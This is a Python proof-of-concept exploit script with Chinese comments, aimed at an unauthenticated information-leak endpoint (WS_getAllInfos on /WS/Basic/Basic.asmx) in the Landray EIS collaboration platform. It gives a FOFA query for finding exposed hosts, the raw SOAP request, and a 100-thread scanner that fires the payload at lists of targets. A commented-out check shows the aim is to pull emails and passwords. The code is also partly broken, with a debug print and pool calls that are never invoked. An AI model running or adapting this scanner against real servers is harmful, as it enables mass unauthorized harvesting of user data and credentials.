# fofa：app="Landray-EIS智慧协同平台"
"""poc：POST /WS/Basic/Basic.asmx HTTP/1.1
        Host: 
        Content-Type: text/xml
        Content-Length: 249

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
        <soapenv:Header/>
        <soapenv:Body>
        <tem:WS_getAllInfos/>
        </soapenv:Body>
        </soapenv:Envelope>"""



# 导包
import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
   ____            ____            _      
  / __ \   /\     |  _ \          (_)     
 | |  | | /  \    | |_) | __ _ ___ _  ___ 
 | |  | |/ /\ \   |  _ < / _` / __| |/ __|
 | |__| / ____ \  | |_) | (_| \__ \ | (__ 
  \____/_/    \_\ |____/ \__,_|___/_|\___|
                                          
                                          
"""
    print(test)


def main():
    banner()

    # 初始化
    parse = argparse.ArgumentParser(description="蓝凌OA Basic存在未授权信息泄露")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='Please input your url')
    parse.add_argument('-f','--file',dest='file',type=str,help='Please input your file')

    # 实例化
    args = parse.parse_args()

    # 判断
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(target):
    link = '/WS/Basic/Basic.asmx'
    headers = {
        "Content-Type": "text/xml",
        "Content-Length": "249"
    }
    data = """<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
            <soapenv:Header/>
            <soapenv:Body>
            <tem:WS_getAllInfos/>
            </soapenv:Body>
            </soapenv:Envelope>"""

    try:
        res1 = requests.get(url=target,headers=headers,timeout=15,verify=False)
        if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,data=data,timeout=15,verify=False)
            print(type(res2.text))
            # if "email" and "password" in res2.text:
            #     print(f"[+]该{target}存在信息泄露")
            #     with open('result.txt','a',encoding='utf-8')as f:    # 将结果保存到result.txt中
            #         f.write(f"[+]该{target}存在sql注入"+'\n')
            # else:
            #     print(f"[-]该{target}不存在信息泄露")
    except:
        print(f"该{target}存在问题，请手工进行测试")


if __name__ == "__main__":
    main()